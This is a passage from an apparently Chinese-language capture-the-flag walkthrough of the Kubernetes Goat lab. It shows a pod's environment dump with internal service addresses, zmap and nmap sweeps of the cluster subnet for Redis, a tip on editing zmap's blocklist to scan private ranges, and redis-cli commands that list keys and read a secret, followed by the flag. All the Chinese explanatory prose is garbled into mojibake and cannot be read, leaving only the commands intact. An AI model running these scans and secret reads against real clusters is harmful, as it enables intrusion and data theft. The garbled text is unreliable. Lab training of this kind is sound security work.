<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.97</span>.177.195
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.102.119.162:5000
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.96</span>.0.1
<span class="token assign-left variable">METADATA_DB_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.99.22.157:80
<span class="token assign-left variable">KUBESEC_VERSION</span><span class="token operator">=</span><span class="token number">2.11</span>.4
<span class="token assign-left variable">KUBEAUDIT_VERSION</span><span class="token operator">=</span><span class="token number">0.18</span>.0
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.107</span>.180.113
<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP</span><span class="token operator">=</span>tcp://10.107.180.113:5000
<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_PORT</span><span class="token operator">=</span><span class="token number">443</span>
<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">HELM_VERSION</span><span class="token operator">=</span><span class="token number">3.2</span>.2
<span class="token assign-left variable">KUBECTL_WHOCAN_VERSION</span><span class="token operator">=</span><span class="token number">0.4</span>.0
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.102.202.149:80
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.108</span>.181.246
<span class="token assign-left variable">METADATA_DB_SERVICE_PORT_HTTP</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.108</span>.181.246
<span class="token assign-left variable">AMICONTAINED_VERSION</span><span class="token operator">=</span><span class="token number">0.4</span>.9
<span class="token assign-left variable">KUBECTL_VERSION</span><span class="token operator">=</span><span class="token number">1.24</span>.0
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.107.180.113:5000
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
<span class="token assign-left variable">DOCKER_VERSION</span><span class="token operator">=</span><span class="token number">19.03</span>.9
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT</span><span class="token operator">=</span><span class="token number">8080</span>
<span class="token assign-left variable">CFSSL_VERSION</span><span class="token operator">=</span><span class="token number">1.6</span>.1
<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP</span><span class="token operator">=</span>tcp://10.97.177.195:3000
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.105</span>.18.49
<span class="token assign-left variable">AMASS_VERSION</span><span class="token operator">=</span><span class="token number">3.6</span>.3
<span class="token assign-left variable">CONFTEST_VERSION</span><span class="token operator">=</span><span class="token number">0.21</span>.0
<span class="token assign-left variable">BUILD_CODE_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.97</span>.177.195
<span class="token assign-left variable">KUBERNETES_PORT_443_TCP</span><span class="token operator">=</span>tcp://10.96.0.1:443
<span class="token assign-left variable">KUBERNETES_SERVICE_PORT_HTTPS</span><span class="token operator">=</span><span class="token number">443</span>
<span class="token assign-left variable">KUBERNETES_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.96</span>.0.1
<span class="token assign-left variable">METADATA_DB_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.99</span>.22.157
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">8080</span>
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.108.181.246:8080
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.100</span>.116.234
<span class="token assign-left variable">KUBEBENCH_VERSION</span><span class="token operator">=</span><span class="token number">0.3</span>.0
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.105.18.49:80
<span class="token assign-left variable">GITLEAKS_VERSION</span><span class="token operator">=</span><span class="token number">8.8</span>.11
<span class="token assign-left variable">TLDR_VERSION</span><span class="token operator">=</span><span class="token number">0.6</span>.1
<span class="token assign-left variable">BUILD_CODE_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.97.177.195:3000
<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP</span><span class="token operator">=</span>tcp://10.108.181.246:8080
~ <span class="token comment"># </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>æœåŠ¡æ¢æµ‹</li>
</ul>
<p>æ”¶é›†åˆ°ç½‘ç»œä¿¡æ¯åï¼Œç”¨ <strong>zmap</strong> å¯¹é›†ç¾¤æ•´ä¸ªç½‘æ®µè¿›è¡Œå†…ç½‘æ‰«æï¼Œé‡ç‚¹å…³æ³¨ <strong>6379 ç«¯å£</strong>ï¼ˆRedis é»˜è®¤ç«¯å£â€”â€”å‡è®¾ç¼“å­˜æœåŠ¡ç”¨çš„æ˜¯ Redisã€‚ä¸è¿‡æµ‹è¯•æ—¶å¯åˆ«å±€é™äºæ­¤ï¼Œå®æˆ˜ä¸­ ElasticSearchã€MongoDBã€MySQL è¿™äº›å†…éƒ¨æœåŠ¡ä¸€æŠ“ä¸€å¤§æŠŠï¼‰ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16 <span class="token parameter variable">-o</span> results.csv <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>éœ€è¦è°ƒæ•´zmapçš„é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºzmapé»˜è®¤ä¸æ‰«10.0.0.0/8</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.29.27.png" style="zoom:50%;">

<p>æ³¨é‡Šæ‰10.0.0.0/8ç½‘æ®µã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.30.14.png" style="zoom:40%;">
</blockquote>
<p><strong>zmap</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16 <span class="token parameter variable">-o</span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.32.58.png" style="zoom:50%;">

<p>è¿™ä¸ªé”™è¯¯æç¤ºè¯´æ˜ ZMap æ— æ³•è‡ªåŠ¨æ£€æµ‹åˆ° IP åœ°å€ <code>10.244.0.1</code>ï¼ˆå¯èƒ½æ˜¯ä½ çš„é»˜è®¤ç½‘å…³ï¼‰å¯¹åº”çš„ MAC åœ°å€ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp <span class="token parameter variable">-n</span> <span class="token number">10.244</span>.0.1 <span class="token comment">#æŸ¥è¯¢ç½‘å…³macåœ°å€</span>
~ <span class="token comment"># arp -n 10.244.0.1</span>
Address                  HWtype  HWaddress           Flags Mask            Iface
<span class="token number">10.244</span>.0.1               ether   <span class="token number">22</span>:53:bf:42:b2:1d   C                     eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>å†æ¬¡è¿è¡Œzmapï¼š</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.42.03.png" style="zoom:50%;">

<p><strong>nmap</strong></p>
<p>ä¹Ÿå¯ä»¥ç”¨nmapæ‰«æï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.45.08.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.42.48.png" style="zoom:50%;">

<ul>
<li>æ”»å‡»redis 6379ç«¯å£è¯»å–æ•æ„Ÿä¿¡æ¯</li>
</ul>
<p>ç»è¿‡é›†ç¾¤å†…ç½‘æ‰«æå‘ç°10.244.0.5çš„6379ç«¯å£å¼€æ”¾ï¼Œå¹¶ä¸”å¯ä»¥pingé€šã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.49.32.png" style="zoom:40%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">10.244</span>.0.5
KEYS * <span class="token comment"># åˆ—å‡ºæ‰€æœ‰é”®</span>
GET SECRETSTUFF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.51.39.png" style="zoom:40%;">

<ul>
<li>flag</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-a5a3e446faafa9d0514b3ff396ab8a40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-9-Hidden-in-layersğŸŒŸ"><a href="#3-9-Hidden-in-layersğŸŒŸ" class="headerlink" title="3.9 Hidden in layersğŸŒŸ"></a>3.9 Hidden in layersğŸŒŸ</h2><p>åˆ†æKubernetesé›†ç¾¤å®¹å™¨é•œåƒä¸­çš„éšè—å±‚ã€‚</p>
<h3 id="3-9-1-åœºæ™¯ä»‹ç»"><a href="#3-9-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.9.1 åœºæ™¯ä»‹ç»"></a>3.9.1 åœºæ™¯ä»‹ç»</h3><p>åœ¨äº’è”ç½‘ä¸Šä¸‹è½½å¹¶ä½¿ç”¨çš„å¤§å¤šæ•°å®¹å™¨é•œåƒéƒ½æ˜¯ç”±å…¶ä»–äººåˆ›å»ºçš„ã€‚å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“å®ƒä»¬æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼ˆæ²¡æœ‰Dockerfileï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯èƒ½ä¼šé¢ä¸´å®‰å…¨é£é™©ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä½•ä½¿ç”¨å†…ç½®çš„åº”ç”¨ç¨‹åºå’Œä¸€äº›æµè¡Œçš„å¼€æºç¨‹åºï¼ˆå¦‚diveï¼‰æ¥åˆ†ædockerå®¹å™¨é•œåƒå±‚ã€‚</p>
<p>æ•æ„Ÿä¿¡æ¯æ³„éœ²æ˜¯ç°å®ä¸­æœ€å¸¸è§çš„æ¼æ´ä¹‹ä¸€ã€‚åœ¨å®¹å™¨åŒ–çš„ä¸–ç•Œä¸­ï¼Œå¯¹å¯†ç ã€ç§é’¥ã€ä»¤ç‰Œç­‰çš„é”™è¯¯å¤„ç†å¾ˆå®¹æ˜“ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å°†åˆ†æubernetesé›†ç¾¤å®¹å™¨é•œåƒä¸­çš„éšè—å±‚ï¼Œæ‰¾åˆ°ç›®æ ‡flagã€‚</p>
<p>å®è·µç›®çš„ï¼š</p>
<ul>
<li><p>å¦‚ä½•æ¢ç´¢å’Œåˆ†ædockerå®¹å™¨é•œåƒã€‚</p>
</li>
<li><p>èƒ½å¤Ÿä½¿ç”¨æ ‡å‡†çš„å‘½ä»¤è¡Œå·¥å…·åˆ†æå®¹å™¨é•œåƒã€‚</p>
</li>
<li><p>ä½¿ç”¨åƒdiveè¿™æ ·çš„å¼€æºå·¥å…·æ¥æ‰§è¡Œå®¹å™¨é•œåƒåˆ†æã€‚</p>
</li>
</ul>
<h3 id="3-9-2-åœºæ™¯è®¿é—®"><a href="#3-9-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.9.2 åœºæ™¯è®¿é—®"></a>3.9.2 åœºæ™¯è®¿é—®</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get <span class="token function">jobs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

